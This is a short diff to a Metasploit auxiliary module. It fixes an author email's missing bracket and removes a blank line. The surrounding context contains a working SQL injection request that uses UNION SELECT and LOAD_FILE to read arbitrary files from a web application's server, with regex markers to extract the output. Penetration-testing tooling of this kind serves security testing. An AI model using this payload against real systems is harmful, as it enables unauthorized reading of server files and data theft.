@@ -25,7 +25,7 @@ class Metasploit3 < Msf::Auxiliary
       'Author'         =>
         [
           'Jakub Galczyk', #initial discovery
-          'Brandon Perry <bperry.volatile@gmail.com', #meatpistol module
+          'Brandon Perry <bperry.volatile@gmail.com>', #meatpistol module
         ],
       'References'     =>
         [
@@ -70,7 +70,6 @@ class Metasploit3 < Msf::Auxiliary
       'data' => "save=1&filter_user_id=0&filter_project_id=0&filter_config_id=-7856%27+UNION+ALL+SELECT+11%2C11%2C11%2C11%2CCONCAT%280x71676a7571%2CIFNULL%28CAST%28HEX%28LOAD_FILE%280x#{filepath}%29%29+AS+CHAR%29%2C0x20%29%2C0x7169727071%29%2C11%23&apply_filter_button=Apply+Filter",
       'cookie' => cookie,
     })
-
 
     resp.body =~ /qgjuq(.*)qirpq/
 
